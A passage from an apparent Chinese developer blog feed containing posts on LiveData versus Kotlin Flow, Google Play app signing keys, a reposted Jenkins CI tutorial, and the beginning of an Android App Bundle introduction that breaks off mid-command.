title="总结"></a>总结</h1><p>简单往往意味着不够强大，而强大又常常意味着复杂,两者往往不能兼得，软件开发过程中常常面临这种取舍。<br><code>LiveData</code>的简单并不是它的缺点，而是它的特点。<code>StateFlow</code>与<code>SharedFlow</code>更加强大，但是学习成本也显著的更高.<br>我们应该根据自己的需求合理选择组件的使用</p><ol><li>如果你的数据流比较简单，不需要进行线程切换与复杂的数据变换，<code>LiveData</code>对你来说相信已经足够了</li><li>如果你的数据流比较复杂，需要切换线程等操作，不需要发送重复值，需要获取<code>myFlow.value</code>，<code>StateFlow</code>对你来说是个好的选择</li><li>如果你的数据流比较复杂，同时不需要获取<code>myFlow.value</code>，需要配置新用户订阅重播无素的个数，或者需要发送重复的值，可以考虑使用<code>SharedFlow</code></li></ol><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://juejin.cn/post/6854573211930066951" title="https://juejin.cn/post/6854573211930066951">Google 推荐在 MVVM 架构中使用 Kotlin Flow</a><br><a href="https://link.juejin.cn/?target=https://alexzh.com/migrate-from-livedata-to-stateflow-and-sharedflow/" title="https://alexzh.com/migrate-from-livedata-to-stateflow-and-sharedflow/">Migrate from LiveData to StateFlow and SharedFlow</a><br><a href="https://juejin.cn/post/6979008878029570055" title="https://juejin.cn/post/6979008878029570055">从 LiveData 迁移到 Kotlin 数据流</a><br><a href="https://juejin.cn/post/6979793981928374308#heading-9" title="https://juejin.cn/post/6979793981928374308#heading-9">关于kotlin中的Collections、Sequence、Channel和Flow (二)</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Google play store App  签名</title>
      <link href="/2022/03/19/Google-play-store-App-%E7%AD%BE%E5%90%8D/"/>
      <url>/2022/03/19/Google-play-store-App-%E7%AD%BE%E5%90%8D/</url>
      
        <content type="html"><![CDATA[<p>内容来自<a href="https://developer.android.com/studio/publish/app-signing#keys_keystores">官方文档</a></p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Android 要求所有 APK 在安装到设备上或更新之前都使用证书进行数字签名。<br>android app bundles 是生成app所有需要的资源文件包，包含代码，各种res 等等。 android studio直接生成的apk包含各种系统和语言的文件：比如x86 和arm cpu的so 文件，各种操作系统的文件，各种语言的文件等。 如果将android app bundles  提交给google play store，那么apk将在用户下载安装之前由google play store从android app bundle(aab) 中抽取适用于用户设备的资源文件和代码生成。 相比于android studio直接生成的apk文件，aab 生成的apk只包含适用于用户设备的so文件，比如只有arm so文件，只适用于用户设备操作系统和尺码的资源文件等。会比传统的apk小不少。<br>如果将android app bundles 提交给google play store发布，那么， 在生成apk的时候，需要google play store对apk进行签名。</p><p> 使用 Android App Bundles 发布时，您需要先使用上传密钥对应用程序包进行签名，然后再将其上传到 Play 管理中心，其余的工作由 Play App Signing 负责。 对于在 Play 商店（2021 年 8 月之前创建）或其他商店使用 APK 分发的应用，您必须手动签署您的 APK 才能上传。<br>今天讲一下android app bundles 在发布到google play store的过程中的签名。</p><h1 id="Play-应用签名"><a href="#Play-应用签名" class="headerlink" title="Play 应用签名"></a>Play 应用签名</h1><p>借助 Play App Signing，Google 可以为您管理和保护您的应用的签名密钥，并使用它来签署您的 APK 以进行分发。 而且，由于 app bundle 将构建和签名 APK 延迟到 Google Play 商店，因此您需要在上传 app bundle 之前配置 Play App Signing。 这样做可以让您从以下方面受益：</p><ul><li>使用 Android App Bundle 并支持 Google Play 的高级交付模式。 Android App Bundle 使您的应用程序更小，您的发布更简单，并且可以使用功能模块并提供即时体验。</li><li>提高您的签名密钥的安全性，并可以使用单独的上传密钥对您上传到 Google Play 的应用程序包进行签名。</li><li>新安装的一次性密钥升级可让您更改应用签名密钥，以防现有的密钥遭到破坏或需要迁移到加密更强的密钥</li></ul><p>Play App Signing 使用两个密钥：应用签名密钥和上传密钥。 在上传到 Google Play 商店之前，需要保留上传密钥并使用它来签署应用程序。 Google 使用上传证书来验证开发者身份，使用应用签名密钥对 APK 进行签名以进行分发，如图 1 所示。通过使用单独的上传密钥，如果密钥丢失或丢失，可以请求重置上传密钥。<br> 相比之下，对于 2021 年 8 月之前创建的未选择加入 Play 应用签名的应用，如果开发者丢失了应用的签名密钥，将无法更新应用。</p><p><img src="https://upload-images.jianshu.io/upload_images/15531792-43e446d47afca4c3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>开发者的密钥存储的框架与 Google 用来存储它自身的密钥的框架是同一个，并受 Google 密钥管理服务的保护。 可以阅读 Google Cloud 安全白皮书来了解有关 Google 技术基础架构的更多信息。</p><p>当使用 Play App Signing 时，如果丢失了上传密钥，或者它被泄露，可以联系 Google 撤销旧的上传密钥，然后生成一个新的。 由于开发者应用签名密钥受 Google 保护，因此即使更改了上传密钥，也可以继续上传新版本的应用，来作为对原始应用的更新。</p><h1 id="密钥库、密钥和证书"><a href="#密钥库、密钥和证书" class="headerlink" title="密钥库、密钥和证书"></a>密钥库、密钥和证书</h1><p>Java 密钥库（.jks 或 .keystore）是用作证书和私钥存储库的二进制文件。<br><strong>公钥证书</strong>（.der 或 .pem 文件），也称为数字证书或身份证书，包含公钥/私钥对的公钥，以及标识所有者的其他一些元数据（例如，名称和位置）谁持有相应的私钥。<br>以下是我们应该了解的不同类型的key：</p><ul><li><strong>应用签名密钥</strong>：用于对安装在用户设备上的 APK 进行签名的密钥。作为 Android 安全更新模型的一部分，签名密钥在您的应用程序的生命周期内永远不会更改。应用签名密钥是私有的，必须保密。但是，您可以共享使用您的应用签名密钥生成的证书。</li><li><strong>上传密钥</strong>：在您上传应用程序包或 APK 以使用 Google Play 进行应用签名之前，您使用该密钥签署该应用程序包或 APK。您必须对上传密钥保密。但是，您可以共享使用上传密钥生成的证书。您可以通过以下方式之一生成上传密钥：</li><li><ul><li>如果您选择让 Google 为您生成应用签名密钥，那么您用于签署应用以供发布的密钥就是您的上传密钥。</li></ul></li><li><ul><li>如果您在选择加入新应用或现有应用时向 Google 提供应用签名密钥，那么您可以选择在选择加入期间或之后生成新的上传密钥以提高安全性。</li></ul></li><li><ul><li>如果您不生成新的上传密钥，您将继续使用您的应用签名密钥作为上传密钥来签署每个版本。</li></ul></li></ul><p><code>提示：为确保您的密钥安全，最好确保您的应用签名密钥和上传密钥不同。</code></p><p>可以在Android Studio -&gt; Generate Signed Bundle or APK 来为app bundle或者apk 进行签名，根据提示可以用已有的key store来签名，也可以在对话框中新生成一个签名。 如果你的app以前以前没有上架过，那么这个签名的密钥叫做上传密钥。</p><p>如果您已经有上传密钥，请使用它来签署应用程序。 相反，如果您的应用已使用现有应用签名密钥签名并发布到 Google Play 商店，请使用它对您的应用(apk)进行签名，并确保对其进行加密并导出， 用作您的应用在Play 上的应用签名。 您可以稍后生成单独的上传密钥并在 Google Play 中注册您的上传密钥的公共证书，以对您的应用程序进行签名和上传后续更新。</p><p>更多信息查看后续官方文档<a href="https://developer.android.com/studio/publish/app-signing#sign-apk">https://developer.android.com/studio/publish/app-signing#sign-apk</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Jenkins详细教程</title>
      <link href="/2022/03/08/Jenkins%E8%AF%A6%E7%BB%86%E6%95%99%E7%A8%8B/"/>
      <url>/2022/03/08/Jenkins%E8%AF%A6%E7%BB%86%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p>[转]<a href="https://www.jianshu.com/p/5f671aca2b5a">Jenkins详细教程</a><br>        最近花了一段时间研究jenkins这个工具。所以写下这篇文章，算是当做记录吧！</p><h1 id="一、jenkins是什么？"><a href="#一、jenkins是什么？" class="headerlink" title="一、jenkins是什么？"></a>一、jenkins是什么？</h1><p>Jenkins是一个开源的、提供友好操作界面的持续集成(CI)工具，起源于Hudson（Hudson是商用的），主要用于持续、自动的构建/测试软件项目、监控外部任务的运行（这个比较抽象，暂且写上，不做解释）。Jenkins用Java语言编写，可在Tomcat等流行的servlet容器中运行，也可独立运行。通常与版本管理工具(SCM)、构建工具结合使用。常用的版本控制工具有SVN、GIT，构建工具有Maven、Ant、Gradle。</p><h1 id="二、CI-CD是什么？"><a href="#二、CI-CD是什么？" class="headerlink" title="二、CI/CD是什么？"></a>二、CI/CD是什么？</h1><p> **CI(Continuous integration，中文意思是持续集成)**是一种软件开发时间。持续集成强调开发人员提交了新代码之后，立刻进行构建、（单元）测试。根据测试结果，我们可以确定新代码和原有代码能否正确地集成在一起。借用网络图片对CI加以理解。</p><p><img src="https://upload-images.jianshu.io/upload_images/15531792-45bf1cf9a54a670f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>**CD(Continuous Delivery， 中文意思持续交付)**是在持续集成的基础上，将集成后的代码部署到更贴近真实运行环境(类生产环境)中。比如，我们完成单元测试后，可以把代码部署到连接数据库的Staging环境中更多的测试。如果代码没有问题，可以继续手动部署到生产环境。下图反应的是CI/CD 的大概工作模式。</p><p><img src="https://upload-images.jianshu.io/upload_images/15531792-3ad00aefe2112935.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h1 id="三、使用Jenkins进行PHP代码-单元-测试、打包。"><a href="#三、使用Jenkins进行PHP代码-单元-测试、打包。" class="headerlink" title="三、使用Jenkins进行PHP代码(单元)测试、打包。"></a>三、使用Jenkins进行PHP代码(单元)测试、打包。</h1><p> Jenkins是一个强大的CI工具，虽然本身使用Java开发，但也能用来做其他语言开发的项目CI。下面讲解如何使用Jenkins创建一个构建任务。</p><p> 登录Jenkins， 点击左侧的新建，创建新的构建任务。</p><p><img src="https://upload-images.jianshu.io/upload_images/15531792-a820463ba0dd3514.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>跳转到如下界面。任务名称可以自行设定，但需要全局唯一。输入名称后选择构建一个自由风格的软件项目(其他选项不作介绍)。并点击下方的确定按钮即创建了一个构建任务。之后会自动跳转到该job的配置页面。<br><img src="https://upload-images.jianshu.io/upload_images/15531792-55a0678ad9864b0a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>下图是构建任务设置界面，可以看到上方的几个选项”General”, “源码管理”， “构建触发器”，”构建环境”， “构建”， “构建后操作”。下面逐一介绍。<br><img src="https://upload-images.jianshu.io/upload_images/15531792-bdd889d714963f41.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h4 id="1-General"><a href="#1-General" class="headerlink" title="1.General"></a>1.General</h4><p>General是构建任务的一些基本配置。名称，描述之类的。<br><img src="https://upload-images.jianshu.io/upload_images/15531792-4f8e3281cdbc3f57.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p><strong>项目名称</strong>: 是刚才创建构建任务步骤设置的，当然在这里也可以更改。<br><strong>描述</strong>: 对构建任务的描述。  <br><strong>丢弃旧的构建</strong>： 服务器资源是有限的，有时候保存了太多的历史构建，会导致Jenkins速度变慢，并且服务器硬盘资源也会被占满。当然下方的”保持构建天数” 和 保持构建的最大个数是可以自定义的，需要根据实际情况确定一个合理的值。</p><p>其他几个选项在这里不做介绍，有兴趣的可以查看Jenkins”帮助信息”， 会有一个大概的介绍。不过这些”帮助信息”都是英文的。</p><p><img src="https://upload-images.jianshu.io/upload_images/15531792-866c8e2021c61163.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h4 id="2-源码管理"><a href="#2-源码管理" class="headerlink" title="2.源码管理"></a>2.源码管理</h4><p>源码管理就是配置你代码的存放位置。<br><img src="https://upload-images.jianshu.io/upload_images/15531792-e4b034a58d8a919e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br> <br><strong>Git</strong>: 支持主流的github 和gitlab代码仓库。因我们的研发团队使用的是gitlab，所以下面我只会对该项进行介绍。</p><p><strong>Repository URL</strong>：仓库地址</p><p><strong>Credentials</strong>：凭证。可以使用HTTP方式的用户名密码，也可以是RSA文件。 但要通过后面的”ADD”按钮添加凭证。</p><p><strong>Branches to build</strong>：构建的分支。*/master表示master分支，也可以设置为其他分支。</p><p><strong>源码浏览器</strong>：你所使用的代码仓库管理工具，如github, gitlab.  </p><p><strong>URL</strong>：填入上方的仓库地址即可。</p><p><strong>Version</strong>: 8.7   这个是我们gitlab服务器的版本。</p><p><strong>Subversion</strong>：就是SVN，这里不作介绍。</p><h4 id="3-构建触发器"><a href="#3-构建触发器" class="headerlink" title="3.构建触发器"></a>3.构建触发器</h4><p>构建触发器，顾名思义，就是构建任务的触发器。<br><img src="https://upload-images.jianshu.io/upload_images/15531792-f3a983bebca517e5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p><strong>触发远程构建(例如，使用脚本)</strong>: 该选项会提供一个接口，可以用来在代码层面触发构建。这里不做介绍，后期可能会用到。</p><p><strong>Build after other projects are built</strong>： 该选项意思是”在其他projects构建后构建”。这里不作介绍，后期可能会用到该选项。</p><p><strong>Build periodically</strong>： 周期性的构建。很好理解，就是每隔一段时间进行构建。日程表类似        linux crontab书写格式。如下图的设置，表示每隔30分钟进行一次构建。<br><img src="https://upload-images.jianshu.io/upload_images/15531792-c0145a66adb34839.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p><strong>Build when a change is pushed to GitLab</strong>：当有更改push到gitlab代码仓库，即触发构建。后面会有一个触发构建的地址，一般被称为webhooks。需要将这个地址配置到gitlab中，webhooks如何配置后面介绍。这个是常用的构建触发器。</p><p><strong>Poll SCM</strong>：该选项是配合上面这个选项使用的。当代码仓库发生改动，jenkins并不知道。需要配置这个选项，周期性的去检查代码仓库是否发生改动。</p><p><img src="https://upload-images.jianshu.io/upload_images/15531792-c16e5cf9fa1c32f3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h4 id="4-构建环境"><a href="#4-构建环境" class="headerlink" title="4.构建环境"></a>4.构建环境</h4><p>构建环境就是构建之前的一些准备工作，如指定构建工具(在这里我使用ant)。<br><img src="https://upload-images.jianshu.io/upload_images/15531792-80dc3401753c3e01.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p><strong>With Ant</strong>：选择这个工具，并指定ant版本和jdk版本。这两个工具的版本我都事先在服务器上安装，并且在jenkins全局工具中配置好了。</p><p>其他选项不作介绍，同样可以查看”帮助信息” 获得使用帮助。</p><h4 id="5-构建"><a href="#5-构建" class="headerlink" title="5.构建"></a>5.构建</h4><p> 选择下方的增加构建步骤。<br><img src="https://upload-images.jianshu.io/upload_images/15531792-3fabbcd6a0ecc9ce.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>可以选择的项很多。这里就介绍”Invoke Ant” 和”Execute shell”.</p><p><strong>Excute shell</strong>： 执行shell命令，该工具是针对linux环境的，windows环境也有对应的工            具”Execute Windows batch command”。 在构建之前，可能我们需要执行一些命令，比如压缩包的解压之类的。为了演示，我就简单的执行  “echo $RANDOM” 这样的linux shell下生产随机数命令。</p><p><strong>Invoke Ant</strong>：Ant是一款java项目构建工具，当然也能用来构建php。</p><p><img src="https://upload-images.jianshu.io/upload_images/15531792-85b612608a6fe2da.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p><strong>Ant Version</strong>： 选择Ant版本。这个ant版本是安装在jenkins服务器上的版本，并且需要在jenkins”系统工具”中设置好。</p><p><strong>Targets</strong>：要执行的操作，一行一个操作任务。以上图为例，build是构建，tar是打包。</p><p><strong>Build File</strong>: 是Ant构建的配置文件，如果不指定，则是在项目路径下的workspace目录中的build.xml。build.xml文件具体怎么配置，后面再细讲。</p><p><strong>properties</strong>: 设定一些变量，这些变量可以在build.xml 中被引用。</p><p><strong>Send files or execute commands over SSH</strong>：发送文件到远程主机或执行命令(脚本)</p><p><img src="https://upload-images.jianshu.io/upload_images/15531792-35d8b5b89093116a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p><strong>Name</strong>: SSH Server的名称。SSH Server可以在jenkins-系统设置中配置。</p><p><strong>source files</strong>: 需要发送给远程主机的源文件。</p><p><strong>Remove prefix</strong>: 移除前面的路径。如果不设置这个参数，则远程主机会自动创建构建源 source files 包含的那个路径。</p><p><strong>Remote directory</strong>: 远程主机目录。</p><p><strong>Exec command</strong>：在远程主机上执行的命令，或者执行的脚本。</p><h4 id="6-构建后操作"><a href="#6-构建后操作" class="headerlink" title="6.构建后操作"></a>6.构建后操作</h4><p> 构建后操作，就是对project构建完成后的一些后续操作，比如生成相应的代码测试报告。<br><img src="https://upload-images.jianshu.io/upload_images/15531792-2a5e75ee20caa395.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p><img src="https://upload-images.jianshu.io/upload_images/15531792-97dd8639722f4567.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p><strong>Publish Clover PHP Coverage Report</strong>：发布代码覆盖率xml格式的文件报告。路径会在”build.xml”文件中定义</p><p><strong>Publish HTML reports</strong>：发布代码覆盖率的HTML报告。  </p><p><strong>Report Crap</strong>: 发布crap报告。</p><p><strong>E-mail Notification</strong>:  邮件通知，构建完成后发邮件到指定的邮箱。</p><h4 id="7-其他相关配置"><a href="#7-其他相关配置" class="headerlink" title="7.其他相关配置"></a>7.其他相关配置</h4><p><strong>SSH Server配置</strong><br>登录jenkins – 系统管理 – 系统设置<br>配置请看下图<br><img src="https://upload-images.jianshu.io/upload_images/15531792-0b0ea31bd95405f5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p><strong>SSH Servers</strong>: 由于jenkins服务器公钥文件我已经配置好，所以之后新增SSH Servers 只需要配置这一项即可。 </p><p><strong>Name</strong>： 自定义，需要全局唯一。</p><p><strong>HostName</strong>: 主机名，直接用ip地址即可。</p><p><strong>Username</strong>: 新增Server的用户名，这里配置的是root。</p><p><strong>Remote Directory</strong>: 远程目录。jenkins服务器发送文件给新增的server默认是在这个目录。</p><h4 id="Ant-配置文件-“build-xml”"><a href="#Ant-配置文件-“build-xml”" class="headerlink" title="Ant 配置文件 “build.xml”"></a>Ant 配置文件 “build.xml”</h4><p>接下来讲解Ant 构建配置文件”build.xml”。 之所以是build.xml 这是因为官方惯例。就好比任何编程语言的入门都会是打印”Hello world”.  你也可以用其他名称代替”build.xml” .</p><p>下面针对配置文件”build.xml” 关键配置进行说明。</p><p><img src="https://upload-images.jianshu.io/upload_images/15531792-ac0c306a79256a91.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>project name就是项目名称，和jenkins所创建的对应。</p><p>target name=”build” 就是构建的名称，和jenkins构建步骤 那里的targets对应。depends指明构建需要进行的一些操作。</p><p>property 用来设置变量。</p><p>fileset 这一行指明了一个文件夹，用include来指明需要包含的文件，exclude指明不包含的文件，”tar”即是打包这个文件夹中匹配到的文件。</p><p>下面的这些target都是一些实际的操作步骤，比如make_runtime这个”target” 就是创建了一些目录。phpcs就是利用PHP_CodeSniffer这个工具 对PHP代码规范与质量检查工具。</p><p><img src="https://upload-images.jianshu.io/upload_images/15531792-8b722a5a7daece60.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p><img src="https://upload-images.jianshu.io/upload_images/15531792-d88d67727fc65cac.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>最后这个target “tar” 就是打包文件。因为上面的build 并没有包含这个target，所以默认情况下，执行build是不会打包文件的，所以在jenkins project配置界面，Ant构建那一步的targets，我们才会有”build” 和 “tar” 这两个targets。如果build.xml 中 “build”这个target depends中已经包含”tar” , 就不需要在jenkins中增加”tar”了。</p><p>其他一些target 都是利用一些工具对php代码的操作，比如phpunit是进行php单元测试。这一些方面我没有深入的研究，只是进行了一些简单的配置，毕竟不是这方面的专业人士。</p><h4 id="配置-Gitlab-webhooks"><a href="#配置-Gitlab-webhooks" class="headerlink" title="配置 Gitlab webhooks"></a>配置 Gitlab webhooks</h4><p>在gitlab的project页面 打开settings，再打开 web hooks 。点击”ADD WEB HOOK” 添加webhook。把之前jenkins配置中的那个url 添加到这里，添加完成后，点击”TEST HOOK”进行测试，如果显示SUCCESS 则表示添加成功。<br><img src="https://upload-images.jianshu.io/upload_images/15531792-e7ab3172acd899c9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p><img src="https://upload-images.jianshu.io/upload_images/15531792-f7d7f7af245220c8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p><img src="https://upload-images.jianshu.io/upload_images/15531792-d8de6d9285672e5f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p><img src="https://upload-images.jianshu.io/upload_images/15531792-96cb1a0dc11e136e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p><img src="https://upload-images.jianshu.io/upload_images/15531792-0a7781186ecbbd88.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>配置phpunit.xml</p><p>phpunit.xml是phpunit这个工具用来单元测试所需要的配置文件。这个文件的名称同样也是可以自定义的，但是要在”build.xml”中配置好名字就行。默认情况下，用”phpunit.xml”, 则不需要在”build.xml”中配置文件名。</p><p><img src="https://upload-images.jianshu.io/upload_images/15531792-389ab0b322311e8c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>fileset dir 指定单元测试文件所在路径，include指定包含哪些文件，支持通配符匹配。当然也可以用exclude关键字指定不包含的文件。<br><img src="https://upload-images.jianshu.io/upload_images/15531792-2eee610a7bd66d7c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h1 id="四、进行jenkins-project-构建"><a href="#四、进行jenkins-project-构建" class="headerlink" title="四、进行jenkins project 构建"></a>四、进行jenkins project 构建</h1><p>第一次配置好jenkins project之后，会自动触发一次构建。此后，每当有commit 提交到master分支（前面设置的是master分支，也可以设置为其他分支），就会触发一次构建。当然也可以在project页面手动触发构建。点击左边的”立即构建” 手动触发构建。</p><p><img src="https://upload-images.jianshu.io/upload_images/15531792-07ae2aa24109c10f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h1 id="五、构建结果说明"><a href="#五、构建结果说明" class="headerlink" title="五、构建结果说明"></a>五、构建结果说明</h1><h4 id="构建状态"><a href="#构建状态" class="headerlink" title="构建状态"></a>构建状态</h4><ul><li><p>Successful蓝色：构建完成，并且被认为是稳定的。</p></li><li><p>Unstable黄色：构建完成，但被认为是不稳定的。</p></li><li><p>Failed红色：构建失败。</p></li><li><p>Disable灰色：构建已禁用</p></li></ul><h4 id="构建稳定性"><a href="#构建稳定性" class="headerlink" title="构建稳定性"></a>构建稳定性</h4><ul><li>构建稳定性用天气表示：晴、晴转多云、多云、小雨、雷阵雨。天气越好表示构建越稳定，反之亦然。</li></ul><h4 id="构建历史界面"><a href="#构建历史界面" class="headerlink" title="构建历史界面"></a>构建历史界面</h4><p> console output： 输出构建的日志信息</p><h1 id="六、jenkins权限管理"><a href="#六、jenkins权限管理" class="headerlink" title="六、jenkins权限管理"></a><strong>六、jenkins权限管理</strong></h1><p>由于jenkins默认的权限管理体系不支持用户组或角色的配置，因此需要安装第三发插件来支持角色的配置，本文将使用Role Strategy Plugin。基于这个插件的权限管理设置请参考这篇文章:<a href="https://link.jianshu.com/?t=http://blog.csdn.net/russ44/article/details/52276222">http://blog.csdn.net/russ44/article/details/52276222</a>，这里不作详细介绍。</p><p>至此，就可以用jenkins周而复始的进行CI了，当然jenkins是一个强大的工具，功能绝不仅仅是以上这些，其他方面要是以后用到，我会更新到这篇文章中。有疑问欢迎在下方留言。</p><p>最后，放上一张Jenkins的思维导图<br><img src="https://upload-images.jianshu.io/upload_images/15531792-917501f4cf6e57ba.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 架构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android App Bundle</title>
      <link href="/2022/03/08/Android-App-Bundle/"/>
      <url>/2022/03/08/Android-App-Bundle/</url>
      
        <content type="html"><![CDATA[<p>[转]<a href="https://zhuanlan.zhihu.com/p/61663559">新姿势来啦 - Android App Bundle</a></p><h1 id="啥是-Android-App-Bundle"><a href="#啥是-Android-App-Bundle" class="headerlink" title="啥是 Android App Bundle"></a>啥是 Android App Bundle</h1><p>很好理解：Google 官方的插件化呗。Android App Bundle = Apk 动态打包，动态组件化的技术，与 Instant App 不同，AAB 是借助 Split Apk 完成动态加载，使用AAB动态下发方式，可以大幅度减少应用体积，总结下特性，就是2个：</p><ul><li>资源选择性加载</li><li>动态下发 lib</li></ul><h4 id="资源选择性加载"><a href="#资源选择性加载" class="headerlink" title="资源选择性加载"></a>资源选择性加载</h4><p>怎么理解这个 资源选择性加载 呢，大家先个图：<br><img src="https://upload-images.jianshu.io/upload_images/15531792-57594c54602b3e97.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>android 因为要适配各种不同硬件和配置，我们有不同 dp 密度的图片文件，语言文件，不同指令集的 so 等，现在 Android App Bundle 来了可以优化这个问题，当然只限于 GooglePlay，在 google 市场我们下载 apk 时，市场先会检测我们手机的特性，然后选择最合适的资源打成 apk 再发给我们，比如我的手机只需要 arm-v7 的 so，hdpi 的图片，剩下的不会下发我们，这样可以大幅度减少 apk 的体积，尤其是对于 so 来说，一个高德地图，不同的 so 包加起来有小 10M 了，这比我们之前自己干的 apk 优化压缩可强多了，不愧是Google 大大，一出手就是神器，可惜啊，Google 服务国内用不了，不知道后续国内会不会跟进</p><h4 id="动态下发库"><a href="#动态下发库" class="headerlink" title="动态下发库"></a>动态下发库</h4><p>这个可就是太 N 了，插件化实现的目标不就是解决动态性的问题吗，之前看 ios，google 封杀国内的插件化和热修复我还悲观了一阵，但是看到 Android App Bundle 后我们还是有些窃喜的，国内的也努力不是白费的，Google 这不就承认了国人的努力嘛</p><p>App Bundles 将一个 apk 拆分成多个 apk，我们的 apk 一般会被拆分为如下几个部分：</p><ul><li>Base Apk：首次安装的apk，公共代码和资源，所以其他的模块都基于Base Apk；</li><li>Configuration APKs：native libraries 和适配当前手机屏幕分辨率的资源；</li><li>Dynamic feature APKs：不需要在首次安装就加载的模块。</li></ul><p><img src="https://upload-images.jianshu.io/upload_images/15531792-13eef0b9e0585e03.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p><img src="https://upload-images.jianshu.io/upload_images/15531792-12c9a24e4f7d008b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>当然啊注意 AAB 并不是一个插件化框架，它利用的是 Android Framework 提供的 split apks 技术来完成的，而所有安装 split apk 工作均是通过 IPC 交由 google play 完成，而不是国内插件化技术的反射代理 hook， 想了解更多关于split apks的内容，请看 <a href="https://link.zhihu.com/?target=https://links.jianshu.com/go?to=https%253A%252F%252Fdeveloper.android.com%252Fstudio%252Fbuild%252Fconfigure-apk-splits%253Fauthuser%253D2">官方文档</a></p><p>另外一点 Android App Bundle 很像阿里的动态化容器框架 Quinox，Quinox 里每个动态部署的库也叫 Bundle，不说这块是不是有什么 PY 交易在里面呢，Quinox 目前没有开源，应该是阿里插件化 Atlas 的进化，详情请看：<a href="https://link.zhihu.com/?target=https://www.jianshu.com/p/b7ee3538936d">支付宝客户端架构解析：Android 容器化框架初探</a></p><p>需要 Android Studio 升级为 3.2 及其以上版本，以添加对 Dynamic Delivery 的支持，会把 base app 构建出构建成 .aab 文件<br><img src="https://upload-images.jianshu.io/upload_images/15531792-a327f5d05663086d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p><img src="https://upload-images.jianshu.io/upload_images/15531792-67d31c8220f136d8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>Android App Bundle 与 APK 不同，App Bundle 纯粹是为了上传文件而设计的，用户无法直接安装和使用它，.aab 只是一个 zip 文件，Google Play 从中生成优化的 APK 并将其提供给设备进行安装。可以考哪考哪 .abb 中的内容：<br><img src="https://upload-images.jianshu.io/upload_images/15531792-c7235cbbacd08cdf.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>然后新的可动态部署的库会以 apk 的形式添加进来，具体请看 google 官方号：<a href="https://link.zhihu.com/?target=https://www.jianshu.com/p/57ed50242989">如何获得更小的应用文件尺寸？来了解下 Android App Bundle</a></p><h1 id="如何使用App-Bundle"><a href="#如何使用App-Bundle" class="headerlink" title="如何使用App Bundle"></a>如何使用App Bundle</h1><ol><li><p>将你的Android Studio升级为3.2及其以上版本</p></li><li><p>添加对Dynamic Delivery的支持<br>其实就是一些基础apk需要东西，比如签名，MAIN入口等，详细请阅读：<a href="https://link.zhihu.com/?target=https://developer.android.google.cn/studio/projects/dynamic-delivery">https://developer.android.google.cn</a></p></li><li><p>构建App Bundle<br>当你是3.2以上的studio时候，就可以选择build bundle,来构建app bundle的文件<br>构建出来就是一个.aab文件</p></li><li><p>通过bundletool工具来测试你的.aab文件<br>下载地址：<a href="https://link.zhihu.com/?target=https://github.com/google/bundletool">https://github.com/google/bundletool</a><br>解压出来就是一个jar包，以bundletool-all-0.6.0.jar为例子</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bundletool-all-0.6.0.jar build-apks 